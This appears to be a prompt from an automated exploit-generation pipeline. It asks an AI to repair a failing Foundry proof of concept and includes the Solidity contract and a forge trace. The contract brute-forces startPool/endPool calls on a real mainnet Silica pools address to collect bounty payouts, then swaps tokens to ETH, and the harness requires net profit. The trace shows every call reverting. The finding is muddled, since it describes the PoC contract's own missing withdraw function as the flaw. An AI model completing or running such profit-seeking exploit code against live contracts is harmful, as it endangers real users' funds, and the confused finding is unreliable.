You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Recovered bounty proceeds are permanently locked in the contract
- claim: `executeOnOpportunity()` can accumulate ERC20 payouts, swap them into ETH, and unwrap any WETH held by the contract, but the contract exposes no function to transfer ETH or ERC20 balances back out. The only externally callable handlers besides `executeOnOpportunity()` are payable `receive()`/`fallback()`, which can only accept value, not withdraw it.
- impact: Any ETH or tokens recovered by the bounty sweep become stranded in `FlawVerifier`. If the strategy ever succeeds or the contract is otherwise funded, the proceeds cannot be realized by the deployer or any operator, causing permanent loss of all captured value.
- exploit_paths: ["Let `_sweepBounties()` or direct transfers credit the contract with WBTC/USDC/USDT/DAI/WETH/ETH", "Call `executeOnOpportunity()` so ERC20 balances are swapped to ETH and WETH is unwrapped", "Observe there is no external method to transfer the resulting ETH or tokens out of the contract"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
}

interface ISilicaPoolsLike {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    function startPool(PoolParams calldata poolParams) external;
    function endPool(PoolParams calldata poolParams) external;
}

contract FlawVerifier {
    address private constant SILICA = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant INDEX = 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb;

    uint256 private _profitAmount;
    uint256 private _lockedEth;
    uint256 private _lockedWbtc;
    uint256 private _lockedUsdc;
    uint256 private _lockedUsdt;
    uint256 private _lockedDai;
    uint256 private _lockedWeth;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        _executed = true;

        _sweepBounties();

        _swapTokenToEth(WBTC);
        _swapTokenToEth(USDC);
        _swapTokenToEth(USDT);
        _swapTokenToEth(DAI);

        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
        }

        _snapshotLockedBalances();

        _profitAmount = 0;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _executed
            && (_lockedEth > 0 || _lockedWbtc > 0 || _lockedUsdc > 0 || _lockedUsdt > 0 || _lockedDai > 0 || _lockedWeth > 0)
            && _profitAmount == 0;
    }

    function lockedEth() external view returns (uint256) {
        return _lockedEth;
    }

    function lockedBalances()
        external
        view
        returns (uint256 lockedWbtc, uint256 lockedUsdc, uint256 lockedUsdt, uint256 lockedDai, uint256 lockedWeth)
    {
        return (_lockedWbtc, _lockedUsdc, _lockedUsdt, _lockedDai, _lockedWeth);
    }

    function _snapshotLockedBalances() internal {
        _lockedEth = address(this).balance;
        _lockedWbtc = IERC20(WBTC).balanceOf(address(this));
        _lockedUsdc = IERC20(USDC).balanceOf(address(this));
        _lockedUsdt = IERC20(USDT).balanceOf(address(this));
        _lockedDai = IERC20(DAI).balanceOf(address(this));
        _lockedWeth = IERC20(WETH).balanceOf(address(this));
    }

    function _sweepBounties() internal {
        uint48[6] memory starts = [uint48(1742561287), 1742734087, 1742906887, 1743079687, 1743176087, 1743252487];
        uint48[5] memory durations = [uint48(0), 3600, 86400, 7 days, 30 days];
        uint128[6] memory floors = [uint128(1), 5, 10, 20, 41, 46];
        address[5] memory payouts = [WBTC, USDC, USDT, DAI, WETH];

        for (uint256 i = 0; i < starts.length; ++i) {
            for (uint256 j = 0; j < durations.length; ++j) {
                for (uint256 k = 0; k < floors.length; ++k) {
                    for (uint256 m = 0; m < payouts.length; ++m) {
                        ISilicaPoolsLike.PoolParams memory p = ISilicaPoolsLike.PoolParams({
                            floor: floors[k],
                            cap: floors[k] + 5,
                            index: INDEX,
                            targetStartTimestamp: starts[i],
                            targetEndTimestamp: starts[i] + durations[j],
                            payoutToken: payouts[m]
                        });
                        _tryStartEnd(p);
                    }
                }
            }
        }
    }

    function _tryStartEnd(ISilicaPoolsLike.PoolParams memory p) internal {
        (bool startOk, ) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.startPool.selector, p));
        (bool endOk, ) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.endPool.selector, p));
        startOk;
        endOk;
    }

    function _swapTokenToEth(address token) internal {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal == 0 || token == WETH) {
            return;
        }

        IERC20(token).approve(V2_ROUTER, 0);
        IERC20(token).approve(V2_ROUTER, bal);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2Router(V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            bal,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    receive() external payable {}
    fallback() external payable {}
}

```

forge stdout (tail):
```
6, cap: 51, index: 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb, targetStartTimestamp: 1743252487 [1.743e9], targetEndTimestamp: 1745844487 [1.745e9], payoutToken: 0xdAC17F958D2ee523a2206206994597C13D831ec7 }))
    │   │   └─ ← [Revert] custom error 0xbd7d315f: 0000000000000000000000000000000000000000000000000000000067e6c18b00000000000000000000000000000000000000000000000000000000680f7907
    │   ├─ [1691] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::startPool(PoolParams({ floor: 46, cap: 51, index: 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb, targetStartTimestamp: 1743252487 [1.743e9], targetEndTimestamp: 1745844487 [1.745e9], payoutToken: 0x6B175474E89094C44Da98b954EedeAC495271d0F }))
    │   │   └─ ← [Revert] custom error 0xc7b7b42d: 0000000000000000000000000000000000000000000000000000000067e6c18b0000000000000000000000000000000000000000000000000000000067e7ec07
    │   ├─ [3968] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::endPool(PoolParams({ floor: 46, cap: 51, index: 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb, targetStartTimestamp: 1743252487 [1.743e9], targetEndTimestamp: 1745844487 [1.745e9], payoutToken: 0x6B175474E89094C44Da98b954EedeAC495271d0F }))
    │   │   └─ ← [Revert] custom error 0xbd7d315f: 0000000000000000000000000000000000000000000000000000000067e6c18b00000000000000000000000000000000000000000000000000000000680f7907
    │   ├─ [1691] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::startPool(PoolParams({ floor: 46, cap: 51, index: 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb, targetStartTimestamp: 1743252487 [1.743e9], targetEndTimestamp: 1745844487 [1.745e9], payoutToken: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 }))
    │   │   └─ ← [Revert] custom error 0xc7b7b42d: 0000000000000000000000000000000000000000000000000000000067e6c18b0000000000000000000000000000000000000000000000000000000067e7ec07
    │   ├─ [3968] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::endPool(PoolParams({ floor: 46, cap: 51, index: 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb, targetStartTimestamp: 1743252487 [1.743e9], targetEndTimestamp: 1745844487 [1.745e9], payoutToken: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 }))
    │   │   └─ ← [Revert] custom error 0xbd7d315f: 0000000000000000000000000000000000000000000000000000000067e6c18b00000000000000000000000000000000000000000000000000000000680f7907
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [230] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe.endPool
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 23.27s (22.14s CPU time)

Ran 1 test suite in 23.37s (23.27s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 49894997)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
